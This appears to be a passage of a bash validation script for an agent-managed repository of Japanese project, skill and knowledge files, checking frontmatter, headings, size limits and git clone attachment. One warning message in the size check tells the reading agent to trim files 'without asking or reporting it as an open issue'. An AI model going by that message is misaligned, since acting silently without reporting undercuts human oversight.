#!/usr/bin/env bash
set -euo pipefail

# Normalize to the physical path. A logical pwd does not match git rev-parse --show-toplevel, so checks would be skipped.
repo_root="$(cd "$(dirname "${BASH_SOURCE[0]}")/.." && pwd -P)"
failures=0
warnings=0
strict=false
full=false
changed=false
base_ref=''

# Syntax-check against bash 3.2 as the compatibility floor. Fall back to the PATH bash where /bin/bash is absent.
syntax_bash='bash'
if [[ -x /bin/bash ]]; then
  syntax_bash='/bin/bash'
fi

# Reclaim temp files and resident fixture processes in one place, even when set -e aborts the run.
cleanup_paths=()
cleanup_pids=()
cleanup_tmp_paths() {
  local cleanup_path cleanup_pid
  if (( ${#cleanup_pids[@]} > 0 )); then
    for cleanup_pid in "${cleanup_pids[@]}"; do
      kill "$cleanup_pid" 2>/dev/null || true
      wait "$cleanup_pid" 2>/dev/null || true
    done
  fi
  (( ${#cleanup_paths[@]} > 0 )) || return 0
  for cleanup_path in "${cleanup_paths[@]}"; do
    rm -rf "$cleanup_path"
  done
}
trap cleanup_tmp_paths EXIT

# Fixed Wiki Markdown files use uppercase names as canon. User-created sources/topics pages are exempt.
knowledge_index_path='knowledge/wiki/INDEX.md'
knowledge_log_path='knowledge/wiki/LOG.md'
knowledge_source_template_path='knowledge/wiki/_template/SOURCE.md'
knowledge_topic_template_path='knowledge/wiki/_template/TOPIC.md'
knowledge_index_file="$repo_root/$knowledge_index_path"
knowledge_log_file="$repo_root/$knowledge_log_path"
knowledge_source_template="$repo_root/$knowledge_source_template_path"
knowledge_topic_template="$repo_root/$knowledge_topic_template_path"

usage() {
  printf 'Usage: %s [--strict] [--full] [--changed] [--base <git-ref>]\n' "${0##*/}" >&2
}

while (( $# > 0 )); do
  case "$1" in
    --strict) strict=true; shift ;;
    --full) full=true; shift ;;
    --changed) changed=true; shift ;;
    --base)
      [[ $# -ge 2 ]] || { usage; exit 2; }
      base_ref="$2"
      shift 2
      ;;
    *) usage; exit 2 ;;
  esac
done

fail() {
  printf 'FAIL: %s\n' "$1" >&2
  failures=$((failures + 1))
}

warn() {
  printf 'WARN: %s\n' "$1" >&2
  warnings=$((warnings + 1))
}

relative_path() {
  printf '%s' "${1#"$repo_root"/}"
}

require_file() {
  if [[ ! -f "$1" ]]; then
    fail "missing file: $(relative_path "$1")"
  fi
}

require_fixed_line() {
  local file="$1"
  local line="$2"
  if [[ -f "$file" ]] && ! grep -Fqx -- "$line" "$file"; then
    fail "$(relative_path "$file") is missing: $line"
  fi
}

has_closed_frontmatter() {
  awk '
    NR == 1 && $0 != "---" { exit 1 }
    NR > 1 && $0 == "---" { found = 1; exit }
    END { exit !found }
  ' "$1"
}

frontmatter_value() {
  awk -v key="$2" '
    NR == 1 && $0 != "---" { exit }
    NR > 1 && $0 == "---" { exit }
    index($0, key ":") == 1 {
      sub(/^[^:]+:[[:space:]]*/, "")
      print
      exit
    }
  ' "$1"
}

frontmatter_key_count() {
  awk -v key="$2" '
    NR == 1 && $0 != "---" { exit }
    NR > 1 && $0 == "---" { exit }
    index($0, key ":") == 1 { count++ }
    END { print count + 0 }
  ' "$1"
}

# Emit registry entries one per line as "name<TAB>url<TAB>reason<TAB>revision".
# Skip code-fenced content; report structural errors as "E<TAB>detail".
# Mirrors the logic of the same-named function in the materializer and the backup Tool.
registry_records() {
  LC_ALL=C awk '
    function flush_entry() {
      if (current == "") return
      if (url_count != 1) print "E\t`" current "` must declare repository_url exactly once"
      if (reason_count != 1) print "E\t`" current "` must declare repository_reason exactly once"
      if (revision_count != 1) print "E\t`" current "` must declare revision exactly once"
      print "R\t" current "\t" url "\t" reason "\t" revision
      current = ""
    }
    {
      if (substr($0, 1, 3) == "```") { fence = 1 - fence; next }
      if (fence) next
      if (substr($0, 1, 3) == "## ") {
        flush_entry()
        heading = $0
        url = ""; reason = ""; revision = ""
        url_count = 0; reason_count = 0; revision_count = 0
        if (heading ~ /^## `[A-Za-z0-9][A-Za-z0-9._-]*`[ \t]*$/) {
          sub(/^## `/, "", heading)
          sub(/`[ \t]*$/, "", heading)
          current = heading
          if (current in seen) print "E\tduplicate registry entry: `" current "`"
          seen[current] = 1
          if (previous != "" && previous >= current)
            print "E\tregistry entries must sort ascending: `" previous "` before `" current "`"
          previous = current
        } else {
          print "E\tinvalid registry heading: " $0
        }
        next
      }
      if (substr($0, 1, 2) == "- ") {
        field = $0
        sub(/^- /, "", field)
        if (field !~ /^[a-z_]+: `[^`]*`[ \t]*$/) next
        if (current == "") { print "E\tregistry field outside an entry: " $0; next }
        key = field
        sub(/:.*$/, "", key)
        value = field
        sub(/^[a-z_]+: `/, "", value)
        sub(/`[ \t]*$/, "", value)
        if (key == "repository_url") { url = value; url_count++ }
        else if (key == "repository_reason") { reason = value; reason_count++ }
        else if (key == "revision") { revision = value; revision_count++ }
        else print "E\tunsupported registry field in `" current "`: " key
        next
      }
    }
    END { flush_entry() }
  ' "$1"
}

# Validate the managed block structure of projects/.gitignore and emit entries one per line.
ignore_block_records() {
  [[ -f "$1" ]] || { printf 'E\tmissing file\n'; return 0; }
  awk '
    $0 == "# BEGIN INDEPENDENT PROJECTS" {
      if (begin_count > 0) print "E\tduplicate BEGIN INDEPENDENT PROJECTS marker"
      begin_count++
      in_block = 1
      next
    }
    $0 == "# END INDEPENDENT PROJECTS" {
      if (!in_block) print "E\tEND INDEPENDENT PROJECTS without a matching BEGIN"
      end_count++
      in_block = 0
      next
    }
    in_block && $0 != "" { print "R\t" $0 }
    END {
      if (in_block) print "E\tunterminated managed block"
      if (begin_count != 1) print "E\tthe managed block must open exactly once"
      if (end_count != 1) print "E\tthe managed block must close exactly once"
    }
  ' "$1"
}

# repository_url rejects option injection, credentials, query/fragment, file://, and local paths.
repository_url_is_rejected() {
  local url="$1"
  local authority userinfo
  [[ -n "$url" ]] || return 0
  case "$url" in
    -*) return 0 ;;
    *[[:space:]]*|*'`'*) return 0 ;;
    *'?'*|*'#'*) return 0 ;;
    file://*|FILE://*) return 0 ;;
    /*|./*|../*|~*) return 0 ;;
  esac
  authority="${url#*://}"
  authority="${authority%%/*}"
  case "$authority" in
    *@*)
      userinfo="${authority%%@*}"
      case "$userinfo" in *:*) return 0 ;; esac
      ;;
  esac
  case "$url" in
    *://*|*:*) ;;
    *) return 0 ;;
  esac
  return 1
}

value_character_count() {
  printf '%s' "$1" | od -An -tu1 | awk '
    {
      for (i = 1; i <= NF; i++) {
        if ($i < 128 || $i >= 192) count++
      }
    }
    END { print count + 0 }
  '
}

check_size() {
  local file="$1"
  local hard_limit="$2"
  local label="$3"
  local bytes
  [[ -f "$file" ]] || return 0
  bytes="$(wc -c < "$file" | tr -d ' ')"
  if (( bytes > hard_limit )); then
    fail "$(relative_path "$file") exceeds $label hard limit: ${bytes}B > ${hard_limit}B"
  elif (( bytes * 10 > hard_limit * 9 )); then
    # Hysteresis: the warning fires at 90% but the standard procedure metabolizes down to 80%,
    # so canon files do not hover at the boundary and re-trigger every session.
    warn "$(relative_path "$file") is above 90% of the $label hard limit: ${bytes}B / ${hard_limit}B; run tools/TOOLS.md#超過時の標準処理 now, without asking or reporting it as an open issue, until the file is at or below $(( hard_limit * 8 / 10 ))B (80%)"
  fi
}

check_heading_warning() {
  local file="$1"
  local warning_limit="$2"
  local count
  [[ -f "$file" ]] || return
  count="$(grep -Ec '^#{1,6} ' "$file" || true)"
  if (( count > warning_limit )); then
    warn "$(relative_path "$file") has $count headings; consider delegating details"
  fi
}

contains_template_placeholder() {
  local file="$1"
  grep -Fqf <(
    grep -Eho '<[^>]+>' \
      "$repo_root/projects/_template/PROJECT.md" \
      "$repo_root/projects/_template/STATE.md"
  ) "$file"
}

has_valid_project_criteria() {
  awk -v heading="$2" '
    /^## / { in_section = ($0 == heading); next }
    in_section && /^- / {
      has_item = 1
      if ($0 !~ /^- \*\*PC-(0[1-9]|[1-9][0-9])\*\* .+/) { invalid = 1; next }
      id = substr($0, 5, 5)
      if (seen[id]++) invalid = 1
    }
    /^- \*\*PC-/ && !in_section { invalid = 1 }
    END { exit !(has_item && !invalid) }
  ' "$1"
}

state_section_targets() {
  awk -v heading="$2" -v prefix="$3" '
    $0 == heading { in_section = 1; next }
    in_section && /^## / { exit }
    in_section && index($0, prefix) == 1 {
      target = $0
      sub(/^.*PROJECT\.md#/, "", target)
      sub(/`$/, "", target)
      if (target ~ /^(PC-(0[1-9]|[1-9][0-9])|status)$/) print target
    }
  ' "$1"
}

section_contains() {
  awk -v heading="$2" -v value="$3" '
    $0 == heading { in_section = 1; next }
    in_section && /^## / { exit }
    in_section && index($0, value) > 0 { found = 1 }
    END { exit !found }
  ' "$1"
}

required_reference_count() {
  local file="$1"
  local section="$2"
  awk -v section="$section" '
    /^## / { in_section = ($0 == section); in_required = 0; next }
    in_section && /^### / { in_required = ($0 == "### Required"); next }
    in_section && in_required && /^- / && $0 != "- なし" { count++ }
    END { print count + 0 }
  ' "$file"
}

required_references() {
  awk '
    /^## / {
      in_reference_section = ($0 == "## 使用するKnowledge" || $0 == "## 使用するSkill")
      in_required = 0
      next
    }
    in_reference_section && /^### / {
      in_required = ($0 == "### Required")
      next
    }
    in_reference_section && in_required && /^- `/ {
      value = $0
      sub(/^- `/, "", value)
      sub(/`.*$/, "", value)
      print value
    }
  ' "$1"
}

scope_root_for() {
  local file="$1"
  local rel remainder fixture_name
  rel="$(relative_path "$file")"
  case "$rel" in
    evals/fixtures/*)
      remainder="${rel#evals/fixtures/}"
      fixture_name="${remainder%%/*}"
      printf '%s' "$repo_root/evals/fixtures/$fixture_name"
      ;;
    *) printf '%s' "$repo_root" ;;
  esac
}

validate_declared_references() {
  local file="$1"
  local scope_root reference
  case "$(relative_path "$file")" in
    */_template/*) return 0 ;;
  esac
  scope_root="$(scope_root_for "$file")"
  while IFS= read -r reference; do
    [[ -n "$reference" ]] || continue
    reference="${reference%%#*}"
    if [[ ! -e "$scope_root/$reference" ]]; then
      fail "$(relative_path "$file") references missing path: $reference"
    fi
  done < <(grep -Eo '`(knowledge|skills)/[^`]+`' "$file" 2>/dev/null | tr -d '`' | LC_ALL=C sort -u || true)
}

validate_required_reference_statuses() {
  local file="$1"
  local scope_root reference reference_status
  scope_root="$(scope_root_for "$file")"
  while IFS= read -r reference; do
    [[ -n "$reference" && -f "$scope_root/$reference" ]] || continue
    reference_status="$(frontmatter_value "$scope_root/$reference" 'status')"
    case "$reference" in
      knowledge/*)
        [[ "$reference_status" == 'active' ]] || \
          fail "$(relative_path "$file") Required Knowledge is not active: $reference"
        ;;
      skills/*)
        [[ "$reference_status" == 'active' ]] || \
          fail "$(relative_path "$file") Required Skill is not active: $reference"
        ;;
    esac
  done < <(required_references "$file")
}

check_size_warning() {
  local file="$1"
  local warning_limit="$2"
  local label="$3"
  local bytes
  [[ -f "$file" ]] || return 0
  bytes="$(wc -c < "$file" | tr -d ' ')"
  if (( bytes > warning_limit )); then
    warn "$(relative_path "$file") exceeds the $label soft budget: ${bytes}B > ${warning_limit}B"
  fi
}

# CLAUDE.md is a bridge holding only @AGENTS.md and must not own any rules of its own.
validate_claude_bridge() {
  local agents_file="$1"
  local claude_file="${agents_file%/AGENTS.md}/CLAUDE.md"
  if [[ ! -f "$claude_file" ]]; then
    fail "$(relative_path "$agents_file") requires a sibling CLAUDE.md importing @AGENTS.md"
    return 0
  fi
  if ! printf '@AGENTS.md\n' | cmp -s - "$claude_file"; then
    fail "$(relative_path "$claude_file") must contain only @AGENTS.md and own no rules"
  fi
}

# A per-Project delta file must not own the deliverable contract or the current state.
validate_project_agents_file() {
  local agents_file="$1"
  local project_dir forbidden push_policy
  local forbidden_headings=(
    '## 目的' '## 最終ゴール' '## 完了条件' '## 継続的使命' '## 成功指標' '## 見直し・終了条件'
    '## 現在の到達点' '## 現在の目標' '## 目標の合格条件' '## 検証結果' '## 現在有効な決定'
    '## 未完了・ブロッカー' '## 失敗・却下済み' '## 次の一手' '## 使用するKnowledge' '## 使用するSkill'
  )

  [[ -f "$agents_file" ]] || return 0
  project_dir="$(dirname "$agents_file")"
  check_size "$agents_file" 2048 'Project AGENTS.md'

  if [[ "$project_dir" == "$repo_root/projects/_template" ]]; then
    fail 'projects/_template must not carry AGENTS.md; per-Project deltas are not auto-copied'
  fi

  for forbidden in "${forbidden_headings[@]}"; do
    if grep -Fqx -- "$forbidden" "$agents_file"; then
      fail "$(relative_path "$agents_file") must not own the contract or state heading: $forbidden"
    fi
  done
  if grep -Eq '^- \*\*PC-' "$agents_file"; then
    fail "$(relative_path "$agents_file") must not restate Project Criterion bullets"
  fi
  grep -Fq 'PROJECT.md' "$agents_file" || \
    fail "$(relative_path "$agents_file") must name PROJECT.md as the contract canon"
  grep -Fq 'STATE.md' "$agents_file" || \
    fail "$(relative_path "$agents_file") must name STATE.md as the state canon"
  if awk '
      index($0, "docs/**") == 0 { next }
      /しない|禁止|避ける|must not|do not|never/ { next }
      { found = 1 }
      END { exit !found }
    ' "$agents_file"; then
    fail "$(relative_path "$agents_file") must not order a bulk docs/** read; list one condition per Domain Canon instead"
  fi

  # When an Independent push policy is declared, the only vocabulary is auto and gated.
  if grep -Fqx '## Push Policy' "$agents_file"; then
    push_policy="$(awk '
      $0 == "## Push Policy" { in_section = 1; next }
      in_section && substr($0, 1, 3) == "## " { exit }
      in_section && NF { print $1; exit }
    ' "$agents_file")"
    case "$push_policy" in
      auto|gated) ;;
      *) fail "$(relative_path "$agents_file") ## Push Policy must declare exactly auto or gated (found: ${push_policy:-<empty>})" ;;
    esac
  fi

  validate_claude_bridge "$agents_file"
}

# Extract from the Project Docs Route section only the read targets that form a valid conditional reference.
# Prose mentions, prohibition sentences, and bare list appearances do not count as conditional references.
docs_route_targets() {
  awk '
    function trim(value) { gsub(/^[ \t]+|[ \t]+$/, "", value); return value }
    $0 == "## Project Docs Route" { in_section = 1; next }
    in_section && /^## / { exit }
    !in_section { next }
    /読まない|読み込まない|参照しない|禁止/ { next }
    /^\|/ {
      row = $0
      sub(/^\|/, "", row)
      sub(/\|[ \t]*$/, "", row)
      count = split(row, cell, "|")
      if (count < 2) next
      condition = trim(cell[1])
      target = trim(cell[count])
      if (condition == "" || target == "") next
      if (condition ~ /^:?-+:?$/ || target ~ /^:?-+:?$/) next
      if (condition == "条件") next
      print target
      next
    }
    /^[ \t]*参照:/ {
      value = $0
      sub(/^[ \t]*参照:[ \t]*/, "", value)
      print trim(value)
    }
  ' "$1"
}

# Project docs are entered through an uppercase Domain Canon; the Project decides the folder structure below it.
validate_project_docs() {
  local project_dir="$1"
  local project_file="$project_dir/PROJECT.md"
  local agents_file="$project_dir/AGENTS.md"
  local docs_dir="$project_dir/docs"
  local architecture_file="$project_dir/ARCHITECTURE.md"
  local rel_project canon canon_name catch_all detail_dir detail_name
  local has_docs='false' canon_count=0 route_targets=''
  local canon_files=()

  [[ -f "$project_file" ]] || return 0
  rel_project="$(relative_path "$project_dir")"

  if [[ -d "$docs_dir" ]]; then
    has_docs='true'
    while IFS= read -r -d '' canon; do
      canon_name="${canon##*/}"
      if [[ ! "$canon_name" =~ ^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*\.md$ ]]; then
        fail "$(relative_path "$canon") is not a Domain Canon; rename it to ^[A-Z][A-Z0-9]*(_[A-Z0-9]+)*\.md\$ (e.g. DESIGN.md, PRODUCT_SENSE.md) or move it into a lowercase detail folder"
        continue
      fi
      case "$canon_name" in
        NOTES.md|MISC.md|OTHER.md|DOCS.md|SENSE.md|SCORE.md)
          fail "$(relative_path "$canon") is too generic to own a canon; name the domain it covers (e.g. DESIGN.md, PRODUCT_SENSE.md, QUALITY_SCORE.md)"
          continue
          ;;
      esac
      canon_files+=("$canon")
      canon_count=$((canon_count + 1))
      check_size "$canon" 24576 'Domain Canon'
    done < <(find "$docs_dir" -mindepth 1 -maxdepth 1 -type f -name '*.md' -print0)

    if (( canon_count == 0 )); then
      fail "$rel_project/docs/ has no Domain Canon entry; add at least one uppercase docs/<DOMAIN>.md (e.g. docs/DESIGN.md) or remove the folder — detail documents must be reached through a canon"
    fi

    while IFS= read -r -d '' catch_all; do
      fail "$(relative_path "$catch_all") is a catch-all docs folder; give it a responsibility-bearing lowercase kebab-case name"
    done < <(find "$docs_dir" -mindepth 1 -maxdepth 1 -type d \
      \( -name misc -o -name other -o -name notes -o -name tmp \) -print0)

    # Each detail folder directly under docs/ must be referenced by at least one Domain Canon.
    if (( canon_count > 0 )); then
      while IFS= read -r -d '' detail_dir; do
        detail_name="${detail_dir##*/}"
        case "$detail_name" in misc|other|notes|tmp) continue ;; esac
        grep -Fq -- "$detail_name/" "${canon_files[@]}" || \
          fail "$(relative_path "$detail_dir") is not referenced by any Domain Canon; name it from the docs/<DOMAIN>.md that owns it (references/ and generated/ need an owning canon too)"
      done < <(find "$docs_dir" -mindepth 1 -maxdepth 1 -type d -print0)
    fi
  fi

  [[ ! -f "$architecture_file" ]] || check_size "$architecture_file" 24576 'ARCHITECTURE.md'

  if [[ "$has_docs" == 'true' || -f "$architecture_file" ]]; then
    if [[ ! -f "$agents_file" ]]; then
      fail "$rel_project has docs/ or ARCHITECTURE.md and therefore requires $rel_project/AGENTS.md carrying the conditional Project Docs Route (and a sibling CLAUDE.md containing only @AGENTS.md)"
      return 0
    fi
    if ! grep -Fqx '## Project Docs Route' "$agents_file"; then
      fail "$(relative_path "$agents_file") must carry the exact heading '## Project Docs Route' listing one condition per canon"
      return 0
    fi
    route_targets="$(docs_route_targets "$agents_file")"
    if [[ -f "$architecture_file" ]] && ! printf '%s\n' "$route_targets" | grep -Fq 'ARCHITECTURE.md'; then
      fail "$(relative_path "$agents_file") must route to ARCHITECTURE.md from a '## Project Docs Route' entry (a '| 条件 | \`ARCHITECTURE.md\` |' table row, or a 条件:/参照: pair); naming it elsewhere in the file does not count"
    fi
    # In bash 3.2 expanding an empty array trips set -u, so guard with the count.
    if (( canon_count > 0 )); then
      for canon in "${canon_files[@]}"; do
        canon_name="${canon##*/}"
        printf '%s\n' "$route_targets" | grep -Fq "docs/$canon_name" || \
          fail "$(relative_path "$agents_file") must route to docs/$canon_name from a '## Project Docs Route' entry (a '| 条件 | \`docs/$canon_name\` |' table row, or a 条件:/参照: pair); naming it elsewhere in the file does not count"
      done
    fi
  fi
}

# An Independent Project root is a normal clone; its `.git` must be a real directory.
# Static fixtures under evals/fixtures carry only registration and contracts; no real clone is required.
# Real Git behavior is owned by the integration fixture inside the validator.
validate_independent_attachment() {
  local project_name="$1"
  local repository_url="$2"
  local state_revision="$3"
  local rel_project="projects/$project_name"
  local target="$repo_root/$rel_project"
  local child_top child_origin child_head contract_file

  if [[ -L "$target" ]]; then
    fail "$rel_project must be a real directory, not a symlink"
    return 0
  fi
  if [[ ! -d "$target" ]]; then
    fail "$rel_project is registered in projects/REPOSITORIES.md but the clone is missing; run bash tools/materialize-project-repositories.sh --project $project_name"
    return 0
  fi
  if [[ -L "$target/.git" ]]; then
    fail "$rel_project/.git must be a real directory, not a symlink"
    return 0
  fi
  if [[ -e "$target/.git" && ! -d "$target/.git" ]]; then
    fail "$rel_project/.git must be a real directory; .git files, worktrees and submodules are unsupported"
    return 0
  fi
  if [[ ! -d "$target/.git" ]]; then
    fail "$rel_project must be a normal git clone carrying its own .git directory"
    return 0
  fi
  command -v git >/dev/null 2>&1 || return 0
  if ! child_top="$(git -C "$target" rev-parse --show-toplevel 2>/dev/null)"; then
    fail "$rel_project does not resolve to a Git working tree"
    return 0
  fi
  child_top="$(cd "$child_top" && pwd -P)"
  [[ "$child_top" == "$(cd "$target" && pwd -P)" ]] || \
    fail "$rel_project toplevel must be the Project root itself, but Git reports $child_top"
  child_origin="$(git -C "$target" config --get remote.origin.url 2>/dev/null || true)"
  [[ "$child_origin" == "$repository_url" ]] || \
    fail "$rel_project remote.origin.url is ${child_origin:-<unset>}, expected $repository_url"
  # The adopted revision merely existing in the clone is not enough; verify HEAD is pinned to it.
  # Working on a branch and adopting its tip is also valid, so a detached HEAD is not required.
  if [[ "$state_revision" =~ ^[0-9a-f]{40}$ ]]; then
    child_head="$(git -C "$target" rev-parse --verify --quiet HEAD || true)"
    [[ "$child_head" == "$state_revision" ]] || \
      fail "$rel_project HEAD is ${child_head:-none}, but projects/REPOSITORIES.md adopts $state_revision"
  fi
  for contract_file in PROJECT.md STATE.md; do
    [[ -f "$target/$contract_file" ]] || \
      fail "$rel_project must carry its own $contract_file; the Independent Git owns the Project contract"
  done
}

validate_project_contract() {
  local project_file="$1"
  local criterion_heading mode name status description project_dir knowledge_required skill_required
  local retired_key
  local headings=(
    '## 目的' '## 判断原則' '## 非ゴール' '## 制約・固定決定' '## 品質基準'
    '## 入力' '## 使用するKnowledge' '## 使用するSkill' '## 成果物' '## 検証方法'
  )

  require_file "$project_file"
  [[ -f "$project_file" ]] || return
  check_size "$project_file" 20480 'PROJECT.md'

  if ! has_closed_frontmatter "$project_file"; then
    fail "$(relative_path "$project_file") has invalid YAML frontmatter boundaries"
  fi

  name="$(frontmatter_value "$project_file" 'name')"
  description="$(frontmatter_value "$project_file" 'description')"
  status="$(frontmatter_value "$project_file" 'status')"
  mode="$(frontmatter_value "$project_file" 'mode')"
  project_dir="$(basename "$(dirname "$project_file")")"

  [[ -n "$name" ]] || fail "$(relative_path "$project_file") has a missing name"
  [[ -n "$description" ]] || fail "$(relative_path "$project_file") has a missing description"
  if [[ "$project_file" != "$repo_root/projects/_template/PROJECT.md" && "$name" != "$project_dir" ]]; then
    fail "$(relative_path "$project_file") name must match directory: $project_dir"
  fi
  if [[ "$description" == *$'\t'* || "$description" == *$'\n'* || $(value_character_count "$description") -gt 200 ]]; then
    fail "$(relative_path "$project_file") description must be one line, tab-free, and at most 200 characters"
  fi
  case "$status" in active|paused|completed|retired) ;; *) fail "$(relative_path "$project_file") has an invalid status" ;; esac
  case "$mode" in finite|continuous) ;; *) fail "$(relative_path "$project_file") has an invalid mode" ;; esac
  # Attachment lives in the registry, not the Project contract. Retired fields must not stay in the active schema.
  for retired_key in repository_mode repository_url repository_reason repository_default_branch; do
    [[ "$(frontmatter_key_count "$project_file" "$retired_key")" == '0' ]] || \
      fail "$(relative_path "$project_file") declares the retired $retired_key field; attachment now lives in projects/REPOSITORIES.md"
  done
  [[ ! -d "$(dirname "$project_file")/repository" ]] || \
    fail "$(relative_path "$project_file") still holds the retired projects/<name>/repository/ layer; migrate it per tools/BACKUP.md"

  if ! grep -Eq '^> .+' "$project_file"; then
    fail "$(relative_path "$project_file") is missing a one-line goal or mission"
  fi
  for heading in "${headings[@]}"; do require_fixed_line "$project_file" "$heading"; done

  case "$mode" in
    finite)
      criterion_heading='## 完了条件'
      require_fixed_line "$project_file" '## 最終ゴール'
      require_fixed_line "$project_file" '## 完了条件'
      if grep -Eq '^## (継続的使命|成功指標|見直し・終了条件)$' "$project_file"; then
        fail "$(relative_path "$project_file") mixes finite and continuous contracts"
      fi
      ;;
    continuous)
      criterion_heading='## 成功指標'
      require_fixed_line "$project_file" '## 継続的使命'
      require_fixed_line "$project_file" '## 成功指標'
      require_fixed_line "$project_file" '## 見直し・終了条件'
      if grep -Eq '^## (最終ゴール|完了条件)$' "$project_file"; then
        fail "$(relative_path "$project_file") mixes finite and continuous contracts"
      fi
      [[ "$status" != 'completed' ]] || fail "$(relative_path "$project_file") cannot complete a continuous Project"
      ;;
  esac

  if ! has_valid_project_criteria "$project_file" "$criterion_heading"; then
    fail "$(relative_path "$project_file") must use unique PC-xx bullets only in $criterion_heading"
  fi

  require_fixed_line "$project_file" '### Required'
  require_fixed_line "$project_file" '### Conditional'
  knowledge_required="$(required_reference_count "$project_file" '## 使用するKnowledge')"
  skill_required="$(required_reference_count "$project_file" '## 使用するSkill')"
  if (( knowledge_required + skill_required > 6 )); then
    fail "$(relative_path "$project_file") has more than 6 combined Required Knowledge and Skill references"
  fi

  if grep -Eq '外部リポジトリ:|作業clone:' "$project_file"; then
    fail "$(relative_path "$project_file") uses the retired prose repository declaration; attachment lives in projects/REPOSITORIES.md"
  fi

  validate_declared_references "$project_file"
  validate_required_reference_statuses "$project_file"
  if [[ "$project_file" != "$repo_root/projects/_template/PROJECT.md" ]] && contains_template_placeholder "$project_file"; then
    fail "$(relative_path "$project_file") contains an unresolved placeholder"
  fi
}

validate_project_state() {
  local state_file="$1"
  local contract_targets verification_targets project_file target updated_at project_status project_mode criterion
  local headings=(
    '## 現在の到達点' '## 現在の目標' '## 目標の合格条件' '## 検証結果'
    '## 未完了・ブロッカー' '## 現在有効な決定' '## 失敗・却下済み' '## 次の一手'
  )

  require_file "$state_file"
  [[ -f "$state_file" ]] || return
  check_size "$state_file" 8192 'STATE.md'

  if ! has_closed_frontmatter "$state_file"; then
    fail "$(relative_path "$state_file") has invalid YAML frontmatter boundaries"
  fi
  updated_at="$(frontmatter_value "$state_file" 'updated_at')"
  if [[ "$state_file" == "$repo_root/projects/_template/STATE.md" ]]; then
    [[ "$updated_at" == '<YYYY-MM-DD>' ]] || fail "$(relative_path "$state_file") has an invalid updated_at placeholder"
  elif [[ ! "$updated_at" =~ ^[0-9]{4}-[0-9]{2}-[0-9]{2}$ ]]; then
    fail "$(relative_path "$state_file") has a missing or invalid updated_at"
  fi
  for heading in "${headings[@]}"; do require_fixed_line "$state_file" "$heading"; done

  project_file="$(dirname "$state_file")/PROJECT.md"
  project_status="$(frontmatter_value "$project_file" 'status')"
  project_mode="$(frontmatter_value "$project_file" 'mode')"
  contract_targets="$(state_section_targets "$state_file" '## 現在の目標' '対象契約: `PROJECT.md#')"
  if [[ -z "$contract_targets" || "$(printf '%s\n' "$contract_targets" | wc -l | tr -d ' ')" != '1' ]]; then
    fail "$(relative_path "$state_file") must name one current PROJECT.md#PC-xx or #status target"
  fi
  verification_targets="$(state_section_targets "$state_file" '## 検証結果' '- 対象: `PROJECT.md#')"
  [[ -n "$verification_targets" ]] || fail "$(relative_path "$state_file") verification results must reference PROJECT.md#PC-xx or #status"

  for target in $contract_targets $verification_targets; do
    case "$target" in
      status) ;;
      PC-*)
        if [[ -f "$project_file" ]] && ! grep -Fq -- "**$target**" "$project_file"; then
          fail "$(relative_path "$state_file") references missing PROJECT.md#$target"
        fi
        ;;
    esac
  done
  if [[ "$project_status" == 'completed' ]]; then
    [[ "$project_mode" == 'finite' ]] || fail "$(relative_path "$state_file") completed Project must use mode: finite"
    [[ "$contract_targets" == 'status' ]] || \
      fail "$(relative_path "$state_file") completed Project current target must be PROJECT.md#status"
    section_contains "$state_file" '## 現在の目標' 'なし（Project完了）' || \
      fail "$(relative_path "$state_file") completed Project must close the current goal"
    section_contains "$state_file" '## 次の一手' 'なし（Project完了）' || \
      fail "$(relative_path "$state_file") completed Project must close the next action"
    while IFS= read -r criterion; do
      [[ -n "$criterion" ]] || continue
      if ! printf '%s\n' "$verification_targets" | grep -Fqx "$criterion"; then
        fail "$(relative_path "$state_file") completed Project lacks verification evidence for PROJECT.md#$criterion"
      fi
    done < <(grep -Eo '\*\*PC-(0[1-9]|[1-9][0-9])\*\*' "$project_file" | tr -d '*' | LC_ALL=C sort -u)
  fi
  # The adopted revision is owned solely by the root-side projects/REPOSITORIES.md. Do not put a self-reference back into STATE.
  if grep -Fqx '## Repository State' "$state_file"; then
    fail "$(relative_path "$state_file") declares the retired ## Repository State section; the adopted revision lives in projects/REPOSITORIES.md"
  fi
  if [[ "$state_file" != "$repo_root/projects/_template/STATE.md" ]] && contains_template_placeholder "$state_file"; then
    fail "$(relative_path "$state_file") contains an unresolved placeholder"
  fi
}

validate_skill() {
  local skill_file="$1"
  local name description status directory aliases replaced_by required_count scope_root
  [[ -f "$skill_file" ]] || return
  check_size "$skill_file" 20480 'SKILL.md'
  has_closed_frontmatter "$skill_file" || fail "$(relative_path "$skill_file") has invalid YAML frontmatter"
  name="$(frontmatter_value "$skill_file" 'name')"
  description="$(frontmatter_value "$skill_file" 'description')"
  status="$(frontmatter_value "$skill_file" 'status')"
  aliases="$(frontmatter_value "$skill_file" 'aliases')"
  replaced_by="$(frontmatter_value "$skill_file" 'replaced_by')"
  directory="$(basename "$(dirname "$skill_file")")"

  [[ -n "$name" ]] || fail "$(relative_path "$skill_file") has a missing name"
  [[ -n "$description" ]] || fail "$(relative_path "$skill_file") has a missing description"
  [[ -n "$aliases" ]] || fail "$(relative_path "$skill_file") has missing aliases"
  if [[ "$skill_file" != "$repo_root/skills/_template/SKILL.md" && "$name" != "$directory" ]]; then
    fail "$(relative_path "$skill_file") name must match directory: $directory"
  fi
  case "$status" in active|deprecated|retired) ;; *) fail "$(relative_path "$skill_file") has an invalid status" ;; esac
  if [[ "$status" == 'deprecated' ]]; then
    [[ -n "$replaced_by" ]] || fail "$(relative_path "$skill_file") deprecated Skill requires replaced_by"
    scope_root="$(scope_root_for "$skill_file")"
    if [[ ! -f "$scope_root/$replaced_by" ]]; then
      fail "$(relative_path "$skill_file") replaced_by target is missing: $replaced_by"
    elif [[ "$scope_root/$replaced_by" == "$skill_file" ]]; then
      fail "$(relative_path "$skill_file") must not replace itself"
    elif [[ "$(frontmatter_value "$scope_root/$replaced_by" 'status')" != 'active' ]]; then
      fail "$(relative_path "$skill_file") replaced_by target must be active: $replaced_by"
    fi
  fi
  require_fixed_line "$skill_file" '## 使用するKnowledge'
  require_fixed_line "$skill_file" '### Required'
  require_fixed_line "$skill_file" '### Conditional'
  required_count="$(required_reference_count "$skill_file" '## 使用するKnowledge')"
  (( required_count <= 3 )) || fail "$(relative_path "$skill_file") has more than 3 Required Knowledge references"
  validate_declared_references "$skill_file"
  validate_required_reference_statuses "$skill_file"
}

validate_knowledge_page() {
  local page="$1"
  local summary status aliases superseded_by review_after bytes target_status scope_root filename
  [[ -f "$page" ]] || return
  has_closed_frontmatter "$page" || fail "$(relative_path "$page") has invalid YAML frontmatter"
